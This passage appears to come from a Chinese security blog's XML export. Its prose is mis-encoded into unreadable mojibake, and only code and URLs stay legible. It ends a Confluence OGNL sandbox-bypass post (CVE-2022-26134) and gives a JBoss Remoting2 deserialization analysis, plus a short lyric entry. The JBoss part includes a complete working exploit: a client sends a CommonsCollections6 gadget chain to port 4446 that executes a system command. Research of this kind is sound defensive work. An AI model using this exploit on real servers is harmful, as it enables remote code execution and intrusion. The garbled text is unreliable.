ÂÖàÁúãÁúãOGNLÂèòÈáèÁöÑÈªëÂêçÂçïÔºåÊääÂΩìÂâçÊâÄÊúâÁöÑ‰∏çÂ∏¶.Âè∑ÁöÑ‰∏ä‰∏ãÊñáÂèòÈáèÈÉΩËøáÊª§‰∫ÜÔºõËÄåÂ∏¶.Âè∑ÂèòÈáèÔºå.Âè∑ÁöÑÂÜÖÂÆπÂèàË¢´Ëß£Êûê‰∏∫Â±ûÊÄßÔºåÊ≤°Ê≥ïÊ≠£Á°ÆËé∑ÂèñÂà∞ÂèòÈáè„ÄÇÊâÄ‰ª•@pwntesterÂ§ß‰Ω¨ÁöÑ‰∏ä‰∏ãÊñáÂ§ßÊ≥ïÂú®ÊàëËøôÈáåÊâçÁñèÂ≠¶ÊµÖÊ≤°Ê≥ïÁªï‰∫ÜÔºå‰πüËÆ∏ÊúâÂà´ÁöÑ‰∏ÄÁßçÂÜôÊ≥ïÔºåÂ∏åÊúõÁ†îÁ©∂Âá∫Êù•ÁöÑÂ∏àÂÇÖÂàÜ‰∫´ÂàÜ‰∫´„ÄÇ ‰ΩÜÁé∞Âú®Êúâ‰∏Ä‰∏™@PÁâõÂÖ¨ÂºÄÁöÑÁªïÊ≤ôÁÆ±POCÔºåÂΩ¢Â¶Ç${Class.forName(&quot;xxxxxxx&quot;)}„ÄÇÊàë‰ª¨ÂõûÁúãÂ±ûÊÄßÈªëÂêçÂçïÊòØÊúâclassÁöÑÔºåÈÇ£‰∏∫‰ªÄ‰πàPÁâõÁöÑPOCÂÜÖËé∑ÂèñÂà∞Á±ªÂÆû‰æãÂë¢ÔºüËøôÂ∞±Ê∂âÂèäÂµåÂ•óÂ±ûÊÄßÁöÑÈóÆÈ¢òÔºåÂΩì‰∏Ä‰∏™Á±ªÊúâgetXXXÊñπÊ≥ïÊó∂ÔºåXXXÂ∞±ÊòØÂÆÉÁöÑÂµåÂ•óÂ±ûÊÄßÔºåËÉΩÈÄöËøá.ÁÇπÂè∑ÁöÑÊñπÂºèËé∑Âèñ„ÄÇËøô‰∏™Â∞ètrickÂ∏∏Âú®Ë°®ËææÂºèËØ≠Ë®Ä‰∏≠Áî®Âà∞ÔºåÁõ∏ÂÖ≥ÁöÑÁî®Ê≥ïÊúâÂ¶ÇSpringÁöÑCVE-2022-22965„ÄÇ ÂêéÈù¢ÁöÑÂà©Áî®ÂèØ‰ª•Áî®ÁªèÂÖ∏ÁöÑScriptEngineManagerÔºå‰πüÂèØ‰ª•ÂèçÂ∞ÑRuntimeÔºå‰ΩÜÂú®ÈªëÂêçÂçï‰∏≠ÁöÑÁ±ªÂêçË¶ÅÊãºÊé•‰ª•‰∏ãÔºåÁÆÄÂçïÁªï‰∏ãÊ≤ôÁÆ±‰∏≠ÁöÑÂÖ≥ÈîÆÂ≠ó„ÄÇ ÂêéËÆ∞ÁÆÄÂçïÁúã‰∏ãÂÆòÊñπÂèëÂ∏ÉÁöÑË°•‰∏ÅÔºåÊÑüËßâhttpmethodnotallowedÂíåinviladmethod‰∏§ÁßçÈ°µÈù¢Áä∂ÊÄÅËøòËÉΩÂà©Áî®Ôºå‰ΩÜÊòØ‰∏çÁü•ÈÅìÊÄé‰πàËß¶ÂèëüòÖ ÂèÇËÄÉhttps://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134 https://twitter.com/phithon_xg/status/1532887542722269184]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>OGNL</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JBoss remoting2ÂçèËÆÆÂèäÂÖ∂ÂèçÂ∫èÂàóÂåñÂàÜÊûê]]></title>
    <url>%2F2022%2F06%2F02%2FJBoss%20remoting2%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂâçÊÆµÊó∂Èó¥ËØª‰∫Ü@Y4arÂ∏àÂÇÖÂàÜÊûêJBossÁöÑÊñáÁ´†Âíå„ÄäA little bit beyong \xAC\xED„ÄãÁöÑÂéüÊñáÔºåËµ∑ÂàùÁÆÄÂçïÁöÑÁúã‰∏ãÔºå‰ª•‰∏∫ÊòØÊôÆÈÄöÁöÑÂèçÂ∫èÂàóÊºèÊ¥ûÔºåÂêéÈù¢ÁªèËøáÂàÜÊûêÊâçÂØüËßâÊòØÂÖ≥‰∫éJBossÁöÑRemoting2ÂçèËÆÆÁöÑÊºèÊ¥û„ÄÇÊú¨Êñá‰ª•JBoss AS 6.1.0.Final‰∏∫‰æãÔºå‰∏ªË¶ÅÂàÜÊûê‰∏é@Y4arÂ∏àÂÇÖÁ®çÊúâ‰∏çÂêåÁöÑ‰∏ÄÁßçÂèçÂ∫èÂàóÂåñËß¶ÂèëÊñπÂºè„ÄÇ Remoting2ÂçèËÆÆRemotingÊúçÂä°Á´ØÁöÑÊ°ÜÊû∂Â¶Ç‰∏ãÂõæÊâÄÁ§∫ÔºåÂú®Êé•ÂèóÊî∂Âà∞‰ªéÁΩëÁªú‰º†ËæìËøáÊù•ÁöÑÊï∞ÊçÆÂêéÔºåÊï∞ÊçÆ‰ºöÁî±UnMarshallerËΩ¨Êç¢Ë∞ÉÁî®ËØ∑Ê±ÇÂØπË±°Ôºå‰º†ÈÄÅÂà∞ServerInvokerÔºåÂÜçÁî±ÂÖ∂Ê†πÊçÆË∞ÉÁî®ËØ∑Ê±ÇÂØπË±°ÁöÑ‰ø°ÊÅØ‰º†ÈÄÅÂà∞Áõ∏Â∫îÁöÑË∞ÉÁî®ÂÆûÁé∞Á±ªInvocationHandler„ÄÇ InvocationHandlerÊâßË°åÂÆåÁöÑËøîÂõûÁªìÊûúÔºå‰ºöÁªèÁî±ServerInvoker‰º†Âà∞MarshallerÔºåÂÜçÁî±MarshallerËΩ¨Êç¢‰∏∫ÁΩëÁªú‰∏≠‰º†ËæìÁöÑÊï∞ÊçÆÔºå‰º†ÂõûÁªôË∞ÉÁî®ÁöÑÂÆ¢Êà∑Á´Ø„ÄÇ ÊºèÊ¥ûÂàÜÊûê‰ªéÁ≤óÁï•ÊµèËßàÊñáÁ´†Ëé∑ÂèñÂà∞ÁöÑ‰ø°ÊÅØÊù•ÁúãÔºåÊºèÊ¥ûÂ≠òÂú®‰∫é3873Âíå4446Á´ØÂè£„ÄÇÈÇ£‰πàÁõ¥Êé•‰∏ãÊñ≠ÁÇπÂú®ServerSocketÔºåÂæÄÂâçÂõûÊ∫ØÂá†Â±ÇÔºåÂèØ‰ª•ÁúãÂà∞ÂàÜÂà´ÊòØÁî±org.jboss.remoting.transport.Connector#startÊñπÊ≥ïÂíåorg.jboss.remoting.transport.socket.SocketServerInvoker#startÂºÄÂêØÁöÑÁõëÂê¨Á´ØÂè£„ÄÇÂú®SocketServerInvokerÂØπË±°‰∏≠ÁöÑpropsÂ±ûÊÄßÂèØ‰ª•ÁúãÂà∞Ëá™ÂÆö‰πâÁöÑÁºñÁ†Å„ÄÅËß£Á†ÅÂ∑•ÂÖ∑Á±ªÔºöInvocationMarshallerÂíåInvocationUnMarshaller„ÄÇ Âú®ÂêéÁ´ØÊ°ÜÊû∂‰∏≠ConnectorÂÖÖÂΩìÁùÄÁÆ°ÁêÜServerInvokerÁöÑËßíËâ≤ÔºåÂπ∂‰∏∫ServerInvokerÊ∑ªÂä†InvocationHandlerÔºåÂÖ∂addInvocationHandlerÂ∞±ÊòØÁî®Êù•ÂÆûÁé∞ËØ•ÂäüËÉΩÁöÑ„ÄÇ 12345678910111213public ServerInvocationHandler addInvocationHandler(String subsystem, final ServerInvocationHandler handler) throws Exception &#123; if (this.invoker == null) &#123; throw new IllegalStateException("You may only add handlers once the Connector is created (via create() method)."); &#125; else &#123; AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; handler.setMBeanServer(Connector.this.server); return null; &#125; &#125;); return this.invoker.addInvocationHandler(subsystem, handler); &#125;&#125; Áî®‰∫é‰æõRemotoingÂÆ¢Êà∑Á´ØË∞ÉÁî®ÁöÑServerInvocationHandlerÂÆûÁé∞Á±ª‰ºóÂ§öÔºåÂåÖÊã¨ÂêÑÁßçÂêÑÊ†∑ÂçèËÆÆÂíå‰ΩøÁî®Âú∫ÊôØ„ÄÇ Âü∫‰∫éConnectorÁöÑÂäüËÉΩÔºåÊàë‰ª¨Âú®ÂÖ∂addInvocationHandlerÊñπÊ≥ïÂ§Ñ‰∏ãÊñ≠ÁÇπÔºåÂèØ‰ª•ÂæóÂá∫JBossÊâÄ‰ΩøÁî®Âà∞ÁöÑInvocationHandler„ÄÇÂú®ÈªòËÆ§ÈÖçÁΩÆ‰∏ãÔºåÂÆûÊµãÂè™‰ºö‰ΩøÁî®Âà∞‰ª•‰∏ã‰∫î‰∏™ServerInvocationHandler„ÄÇÂÖ∂‰∏≠AOPRemotingInvocationHandlerÁ±ªÈÖçÁΩÆÂú®3873Á´ØÂè£ÔºåÂÖ∂‰ΩôÂõõ‰∏™ÈÖçÁΩÆÂú®4446Á´ØÂè£„ÄÇ org.jboss.profileservice.remoting.ProfileServiceInvocationHandler org.jboss.aspects.remoting.AOPRemotingInvocationHandler org.jboss.profileservice.management.upload.remoting.DeployHandler org.jboss.invocation.unified.server.UnifiedInvoker org.jboss.deployment.remoting.DeployHandler ‰ªéÁΩë‰∏äÊâæÂà∞‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØÁöÑDemo‰ª£Á†ÅÔºåÊ≤°ÊúâËÆæÁΩÆsubsystemÂêçÁß∞ÔºåÈªòËÆ§Â∞±ËøõÂà∞‰∫Ü4446Á´ØÂè£‰∏ãÁöÑÁ¨¨‰∏Ä‰∏™InvocationHandler„ÄÇ 123456789101112131415161718192021222324252627import java.net.MalformedURLException; import java.util.HashMap; import org.jboss.remoting.Client; import org.jboss.remoting.InvokerLocator; public class ClientTest &#123; public static void main(String[] args)&#123; String locatorURI = "socket://192.168.78.132:4446"; String params = "/?backlog=50&amp;numAcceptThreads=30&amp;maxPoolSize=30&amp;clientMaxPoolSize=30&amp;clientLeasePeriod=10000&amp;timeout=8000"; locatorURI += params; try &#123; InvokerLocator locator = new InvokerLocator(locatorURI); Client client = new Client(locator,ServerHandle.class.getName()); client.connect(); client.invoke("jhb ",new HashMap&lt;String,String&gt;()); &#125; catch (MalformedURLException e) &#123; e.printStackTrace(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; catch (Throwable e) &#123; e.printStackTrace(); &#125; &#125; &#125; Ë∑üËøõÂà∞org.jboss.deployment.remoting.DeployHandler#invokeÊñπÊ≥ïÔºåÂÖ∂ÈÄªËæëÊòØ‰ªéInvocationRequestËé∑ÂèñÂèÇÊï∞ÂíåËΩΩËç∑ÔºåÂÜçÊ†πÊçÆÂèÇÊï∞ÂÄºË∞ÉÁî®Áõ∏Â∫îÁöÑÊñπÊ≥ï„ÄÇÂÖ∂‰∏≠ÂèÇÊï∞ÁöÑÂÄºÂ∞±ÊòØÂÆ¢Êà∑Á´Ø‰∏≠Ë∞ÉÁî®invokeÊñπÊ≥ï‰º†ÁöÑÂÄº„ÄÇ Êù•Âà∞InvocationRequestÁöÑÂÆö‰πâÂ§ÑÔºåÂÆÉÂÆûÁé∞‰∫ÜSerializableÔºåÂπ∂‰∏îgetParameterÂíågetRequestPayloadÊñπÊ≥ïËé∑ÂèñÂà∞ÁöÑÂ±ûÊÄßÁöÑÁ±ªÂûãÂàÜÂà´‰∏∫ObjectÂíåMap„ÄÇ ËøôÈáåÁõ¥Êé•Âú®Ë∞ÉÁî®ClientÁöÑinvokeÊñπÊ≥ïÊó∂ÔºåparamÊàñmatedataÂèÇÊï∞‰º†ÂÖ•CC6ÁöÑÂØπË±°ÔºåÂç≥ÂèØËß¶ÂèëÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇÂú®Ë∞ÉÁî®Ê†à‰∏≠‰ªéËá™ÂÆö‰πâÁöÑËß£Á†ÅÂ∑•ÂÖ∑Á±ªInvocationUnMarshallerÂºÄÂßãÔºå‰∏≠Èó¥Ê≤°ÊúâÂèçÂ∫èÂàóÂåñÁ±ªÈªëÁôΩÂêçÂçïÁ≠âÈò≤Êä§Êé™ÊñΩÔºå‰∏ÄË∑ØÊù•Âà∞ObjectInputStreamÁöÑreadObjectÊñπÊ≥ïÂèçÂ∫èÂàóÂåñËøòÂéüCC6ÂØπË±°„ÄÇ Âè¶‰∏Ä‰∏™Â≠òÂú®ÊºèÊ¥ûÁöÑÁ´ØÂè£3873ÔºåË∞ÉÁî®Ê†à‰∏≠ÂèçÂ∫èÂàóÂåñÊòØ‰ªéSerializableUnMatshallerÂºÄÂßãÔºå‰ΩÜÊúÄÁªàËøáÁ®ãÊòØ‰∏ÄÊ†∑ÁöÑ„ÄÇ ÊúÄÁªàÂÆåÊï¥POCÂ¶Ç‰∏ãÔºö 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class SimpleClient &#123; public static void main(String[] args) throws Throwable &#123; makeInvocation("socket://192.168.78.155:4446/"); &#125; public static void makeInvocation(String locatorURI) throws Throwable &#123; InvokerLocator locator = new InvokerLocator(locatorURI); System.out.println("Calling remoting server with locator uri of: " + locatorURI); Client remotingClient = new Client(locator); HashMap&lt;String,Object&gt; mateMap = new HashMap&lt;&gt;(); mateMap.put("test",ApacheCommonsCollections6.getObject()); remotingClient.connect(); remotingClient.invoke(mateMap); remotingClient.invoke("jhb ",mateMap); &#125;&#125;class ApacheCommonsCollections6 &#123; public static Object getObject() throws Exception &#123; Transformer[] realChain = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123; "getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"whoami"&#125;)&#125;; Transformer chain = new ChainedTransformer(realChain); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chain); TiedMapEntry tme = new TiedMapEntry(outermap, "mykey"); HashSet hs = new HashSet(1); hs.add("diggid"); Field mapField = Class.forName("java.util.HashSet").getDeclaredField("map"); mapField.setAccessible(true); HashMap hm = (HashMap) mapField.get(hs); Field tableField = Class.forName("java.util.HashMap").getDeclaredField("table"); tableField.setAccessible(true); Object[] tableArray = (Object[]) tableField.get(hm); Object table = tableArray[0]; Field key = table.getClass().getDeclaredField("key"); key.setAccessible(true); key.set(table, tme); return hs; &#125;&#125; Èöè‰æøÁúãÁúãÂâçÈù¢ÊúâËØ¥Âà∞remoting2Èô§‰∫ÜsocketÂ§ñÔºåËøòÊîØÊåÅÂÖ∂‰ªñ‰∏Ä‰∫õÂçèËÆÆÔºå‰ΩÜÈªòËÆ§Ê®°Âºè‰∏ãÂü∫‰∫ésocketÂçèËÆÆÁöÑremoting2ÂçèËÆÆË¢´Áî®Âà∞„ÄÇ‰∏çËøáÂÖ∂‰∏≠ÁöÑWebInvoctonHandlerËøòÊòØÊå∫Âê∏Âºï‰∫∫ÁöÑ„ÄÇÁúã‰∫ÜJBossÁöÑÊñáÊ°£ÔºåÂèëÁé∞ÊúâÂÖ≥‰∫éËøô‰∏™InvocationHandlerÁöÑ‰ªãÁªçÔºåÂÆÉÂèØ‰ª•ÈÄöËøáhttpÂçèËÆÆËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇ 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class SimpleClient &#123; // Default locator values private static String transport = "http"; private static String host = "localhost"; private static int port = 5400; public void makeInvocation(String locatorURI) throws Throwable &#123; // create InvokerLocator with the url type string // indicating the target remoting server to call upon. InvokerLocator locator = new InvokerLocator(locatorURI); System.out.println("Calling remoting server with locator uri of: " + locatorURI); Client remotingClient = new Client(locator); // make invocation on remoting server and send complex data object // by default, the remoting http client invoker will use method type of POST, // which is needed when ever sending objects to the server. So no metadata map needs // to be passed to the invoke() method. Object response = remotingClient.invoke(new ComplexObject(2, "foo", true), null); System.out.println("\nResponse from remoting http server when making http POST request and sending a complex data object:\n" + response); Map metadata = new HashMap(); // set the metadata so remoting client knows to use http GET method type metadata.put("TYPE", "GET"); // not actually sending any data to the remoting server, just want to get its response response = remotingClient.invoke((Object) null, metadata); System.out.println("\nResponse from remoting http server when making GET request:\n" + response); // now set type back to POST and send a plain text based request metadata.put("TYPE", "POST"); response = remotingClient.invoke(WebInvocationHandler.STRING_RETURN_PARAM, metadata); System.out.println("\nResponse from remoting http server when making http POST request and sending a text based request:\n" + response); // notice are getting custom response code and message set by web invocation handler Integer responseCode = (Integer) metadata.get(HTTPMetadataConstants.RESPONSE_CODE); String responseMessage = (String) metadata.get(HTTPMetadataConstants.RESPONSE_CODE_MESSAGE); System.out.println("Response code from server: " + responseCode); System.out.println("Response message from server: " + responseMessage); &#125;&#125; ËôΩÁÑ∂Âú®JBossËøôÈáåÁî®Âà∞WebInvoctonHandlerÔºå‰ΩÜÊòØÊ†πÊçÆJBossÁöÑDemoÈÖçÁΩÆÊñá‰ª∂ÁªôÂá∫ÁöÑË∑ØÂæÑ/servlet-invoker/ServerInvokerServletÔºåÂèØ‰ª•Êü•Âà∞Âü∫‰∫éJBossÂºÄÂèëÁöÑJBoss Operations NetworkÂ≠òÂú®ÂÖ≥‰∫éWebInvoctonHandlerÁöÑÊºèÊ¥ûÔºåCVEÁºñÂè∑‰∏∫CVE-2016-3737„ÄÇ ÂêéËÆ∞Áúã‰∫ÜJBossÂÖ∂‰ªñÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÅ4446Âíå3873Ëøô‰∏§‰∏™Á´ØÂè£ÊºèÊ¥ûÔºåÊÑüËßâJBossÂ∞±ÂÉè‰∏™Á≠õÂ≠êÔºåÁâπÂà´ÊòØRemotingËøô‰∏™ÂçèËÆÆ„ÄÇÂêéÈù¢Âú®JBoss EAP 6.xÂíåJBoss/Wildfly AS 7.xÂèäÂæÄÂêéÁâàÊú¨ÔºåJBoss/WildflyÂ∑≤ÈªòËÆ§‰∏ç‰ΩøÁî®remoting2ÂçèËÆÆÔºåËÄåÊòØ‰ΩøÁî®‰∫ÜÂºïÂÖ•Ë∫´‰ªΩËÆ§ËØÅÊú∫Âà∂ÁöÑremoting3ÂçèËÆÆ„ÄÇÊÑüËßâremoting3ÂçèËÆÆÂèØÂàÜÊûêÁúãÁúã‰πüÊ≤°Êúâ‰ªÄ‰πàÊºèÊ¥ûÔºå‰ΩÜÊúÄÂùëÁöÑÊòØËøô‰πàÂ§öÂπ¥ËøáÂéª‰∫ÜÔºåremoting3Á´üÁÑ∂Ëøû‰ªΩÊñáÊ°£ÈÉΩÊ≤°Êúâ„ÄÇ„ÄÇ„ÄÇ Êñá‰∏≠Ëã•Êúâ‰ªÄ‰πàÈîôËØØÁöÑÂú∞ÊñπÔºåÊÅ≥ËØ∑ÂêÑ‰ΩçÂ∏àÂÇÖÊñßÊ≠£„ÄÇ ÂèÇËÄÉhttps://docs.jboss.org/jbossremoting/2.5.4.SP5/guide/html_single/ https://docs.jboss.org/jbossremoting/2.5.4.SP5/userguide/html_single/ https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/ https://www.tenable.com/security/research/tra-2016-22]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂèçÂ∫èÂàóÂåñ</tag>
        <tag>JBoss</tag>
        <tag>remoting</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÊÉäÂõûÊôìÊ¢¶ÂøÜÁßãÂ®ü]]></title>
    <url>%2F2022%2F04%2F25%2F%E6%83%8A%E5%9B%9E%E6%99%93%E6%A2%A6%E5%BF%86%E7%A7%8B%E5%A8%9F%2F</url>
    <content type="text"><![CDATA[ÊÉäÂõûÊôìÊ¢¶ÔºåÈπ§Âî≥Â£∞Â£∞ÔºåÂèàÂ£∞Â£∞ÂØíËßíÂêπÈÅçÊ±üÂüéÔºåÈöîÂ≤∏ËíπËë≠‰∫∫ÂØÇÈùôÔºåÂ∫üÊ±†‰πîÊú®‰πüÂéåË®ÄÂÖµÔºåÊò®Â§úÈÜâ‰π°ÈöæÈÖ©ÈÖäÔºå‰ªäÊúùÊ≠ßË∑ØÊú™ÂàÜÊòéÔºåÊ®äÂ∑ùËêΩÈ≠ÑÊÇ≤ÂêåÂëΩÔºåÊÉÖÂà∞Ê∑±Êó∂‰∏ÄÊ≠ªËΩªÔºåÈáçËøòÊúâ Á∫¶‰ΩÜÁ≥ªÊúüÊó†ÂÆöÔºåÂèàÊÄïËµ¢ÂæóÈùíÊ•ºËñÑÂπ∏ÂêçÔºåËæóËΩ¨ÊÄùÈáèÂøÉËá™ÁúÅÔºåÈÉΩÁ≥ªÊñáÁ´†Ë¥üÊàëÊàëË¥üÂçøÂçøÔºå‰º∞ËØùÈíüÈºéÂ±±ÊûóËôΩÂàôÁöÜÂπªÂΩ±ÔºåÊúâ‰∏™È£éÂ∞òÁü•Â∑≤‰∏çË¥üÊàëÁîüÂπ≥ÔºåÊÄéÊÉ≥‰∏§ÊúàÁª∏Áº™Â¶ÇÁîªÈ•ºÔºåÂè™Êç¢Âæó‰∏ÄËàπÁ¶ªÊÅ®Áã¨ÂØπÊï∞Â≥∞ÈùíÔºåÊ≠£Á≥ªÁ¥†ÊÑøÁ©∫ÁïôÊòéÁè†‰æçËÅòÔºåÊüî‰∏ùËá™ÁºöÊÖßÂâëÊó†ÁÅµÔºåÈü∂ÂçéÂ¶ÇÊ¢¶ÁªàÈ°ªËÆ§Ôºå‰∫âÊïôÁ∫¢Ê≥™‰∏çÊàêÂÜ∞Ôºå‰Ω†ÊÑøÂåñËù∂Áõ∏ÂØª‰ΩÜÁ≥ªË∞Å‰∏∫ÂºïÈ¢ÜÔºå‰Ω†ÈÉΩÊú™Áü•‰ΩïÂ§ÑÊàëÂèàË¶ÅÁôªÁ®ã„ÄÇ ÂæÅÈÄîÊòºÊ∞∏ÔºåÊàëÂèàÂÄöËì¨ÊêµÔºå‰Ω†ÁùáËçíÊùëÈªÑÂè∂ÂèàËøëÈáçÈò≥ÔºåËÆ∞ÂæóÂéªÂπ¥‰ªäÊó•Â∞ö‰ΩúÈùûÈùûÊÉ≥ÔºåÊÉ≥ËØùÁ•û‰ªôÂîîÊÑøÊÑøÂÅöÈ∏≥È∏ØÔºåÊ∞¥ÊöñÊò•Ê±üÂêåËç°ÊºæÔºå‰∏çÁÆ°‰∫∫Èó¥Á¶ªÂêà‰∏ñÊÄÅÁÇéÂáâÔºåÂè™Ë¶ÅÊÇ£ÈöæÁõ∏Êâ∂Ê¨¢ÊÑâÂÖ±‰∫´ÔºåÁîüÊó∂ÊàêÂØπÊ≠ª‰∫¶ÊàêÂèåÔºåÊàëËØùÁ≥ªÂâç‰∏ñÂßªÁºò‰Ω†ËØùÁ≥ªÂÜ§Â≠ΩË¥¶ÔºåÂè™ÊÄ®Â•¥Â•¥ÁîüÈîô‰∏ÄÂâØËΩØÂøÉËÇ†ÔºåÊÄïÊàëÂ§™ËøáÂ§öÊÉÖ‰ºöÂÆπÊòìÂà´ÂêëÔºåÈÅáÁùÄÊµÆËä±Êµ™ËïäÂèàËØùÊÄúÈ¶ôÔºåÊàëÊÑøÂøèÊÇîÂæÄÊó•ÁñèÁãÇÈáçÊ±Ç‰Ω† ËßÅË∞ÖÔºå‰Ω†ÁßçÁúüÊÉÖÁúü‰πâ‰ª§ÊàëÊ≤°ÈΩø‰πüÈöæÂøòÔºåÂè™ÊúõÈùí‰∫ëÊúâË∑Ø‰∫∫Êó†ÊÅôÔºåÊúâÊó•Ëç£ÂΩíË°£Èî¶Êä•Á≠îÁ∫¢Â¶ÜÔºå‰∏™ÈòµÁø†ÁªïÁè†Âõ¥‰∏çÂ§çÂΩìÂπ¥‰∏™Ê†∑ÔºåÊûùÂ§¥È£û‰∏äÁ≠â‰Ω†Ê∞îÂêêÂêçÊâ¨Ôºå‰ªäÊó•Áõ∏ÂÆàÈÉΩÂîîÊú™ËÉΩÈáçÂ≠ò‰πúÈáéÂ•¢ÊúõÔºåÊàë‰∫¶ÂØíÊûùÊã£Â∞ΩÈ¨ìÊüìÁßãÈúúÔºå‰ΩÜÊÑøÂêçËä±Êúâ‰∏ªÊó©Êó•Èô§È≠îÈöúÔºåÊÑø‰Ω†Êó©Êó•Èô§È≠îÈöúÔºåÊõ¥ÊÑø‰∫§ËøòÊÅ©Áà±ÂéªÁ§ºÁ©∫Áéã„ÄÇ È£òÈõ∂ÂéªÔºå‰Ω†ÈÉΩËé´ÈóÆÂâçÂõ†ÔºåÂè™ËßÅÂçäÂ±±ÊÆãÁÖß‰∏Ä‰∏™ÊÑÅ‰∫∫ÔºåÂéªË∑ØËå´Ëå´‰∏çÁ¶ÅÊÇ≤Êù•ÈòµÈòµÔºåÂâçÂ∞òÊÉòÊÉòÊÉπÊàëÊ≥™ËêΩÁ∫∑Á∫∑Ôºå‰ªçÊòØÂøµÂøµ‰∏çÂøòÂøÉÁõ∏Âç∞ÔºåÂ∞öÊúâÂá†ÂõûËÇ†Êñ≠Âá†Â∫¶ÈîÄ‰∫ëÔºåÊú¨ÊÉ≥Â≠¶ÊäïÁ¨î‰ªéÊàéÂõæÂèëÂ•ãÔºåÂç¥Ë¢´ÂÑíÂÜ†ËØØ‰∫ÜÊàëÊúâÂøóÈöæ‰º∏ÔºåÊÉ≥Â≠¶‰∏ÄÊ£π‰∫îÊπñÂêåÈÅÅÈöêÔºåÂç¥Ë¢´Â¶ñÁ∫∑Á¨ºÈÅçËøúÊó†Âû†ÔºåÊÉ≥Â≠¶È£ûËõæÁ†¥Ëåß‰∏çÂ§çÊÉÖ‰∏ùÂõ∞ÔºåÂç¥Ë¢´‰∏ÄÁÅØÁ∫¢ÁÑ∞ÂèàÁÑöË∫´ÔºåÊ≠£Á≥ª‰∫ÜÂæóÁõ∏ÊÄùÈöæ‰∫ÜÊÅ®ÔºåÊ¢¶Êù•‰ΩïÂ§ÑÊõ¥‰∏∫‰∫ëÔºåÈáçËÆ≤‰πúÁü≥ÁÉÇÊµ∑ÊûØÊÉÖ‰∏çÊ≥ØÔºåÂ∞±ÁÆóÈáçÈÄ¢ÊúâÊó•Â∑≤ÊòØË¥ü‰πâÂøòÊÅ©Ôºå‰ªäÊó•ÂÄöÊ•º‰∫∫ËøúÂ§©Ê∂ØËøëÔºåÂë¢‰ª∂ÈùíË°´ÊõæÊüìÊàëÂú∞ËØùÂà´ÂïºÁóïÔºåË•üÂâçÊúâ‰∏§Áì£Á≥ª‰Ω†ÂîáËÑÇÊôïÔºåÂá†Â∫¶Èõ®Ê∑ãÊó•ÊôíËÄåÂÆ∂ÈÉΩËÆ§ÂîîÁúüÔºå‰Ω†ÁùáÊ≤âÊ≤âÊöÆÈú≠Ë•øÈ£éÁ¥ßÔºåÂçóÈ£ûÂåóÈõÅÊÄïÂêëÂÆ¢‰∏≠ÈóªÔºåÂπ≥ÂÆâÊú™Êä•Ëá™ÈóÆÂøÉ‰ΩïÂøçÔºåÁ©∫‰ΩôÊ≥™ÁúºÊúõÊñ≠ÈªÑÊòèÔºåÂèàÂê¨ÂæóÁñèÈíüÂá†ÊùµÂ•Ω‰ººÊù•Áõ∏ÂºïÔºåÂºïÊàëÈÉΩËè©ÊèêÊ†ë‰∏ãËé´ÊÅãÁ∫¢Â∞òÔºåËçâÈôÖÁßãËô´Â£∞Ê∏êÂìΩÔºåÂè™ËßÅÈöîÊûó‰∏ÄÁÇπ‰ΩõÂâçÁÅØÔºå‰ΩõÁõ∏Â∫Ñ‰∏•ÁÅØÂèàÊöóÔºåÊÑßÊàëÊÆâÊÉÖÂâ≤Áà±‰∏§Êó†ËÉΩÔºåËôΩÂàôÊàë‰ΩõÊÖàÊÇ≤ÈÉΩÁ≥ªÈöæÊÅïËñÑÂπ∏ÔºåÁîò‰∏∫ÁæÅÊóÖ‰∫ÜÂç¥ÊÆãÁîüÔºå‰∏ñÈó¥‰ΩïÁâ©Â†™ÈÖ¨Ëµ†ÔºåÂøÉËÄøËÄøÔºå‰ªéÊ≠§È£òËêçÂíåÊñ≠Ê¢óÔºåËÉΩËÆ∏Ê∑±ÊÉÖÈªòÁ∫¶Âè•Âè•ÈÉΩÊó†Âá≠„ÄÇ]]></content>
      <categories>
        <category>Êó•Â∏∏</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JVM ShellcodeÊ≥®ÂÖ•Êé¢Á¥¢]]></title>
    <url>%2F2022%2F03%2F22%2FJVM_Shellcode%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%B4%A2%2F</url>
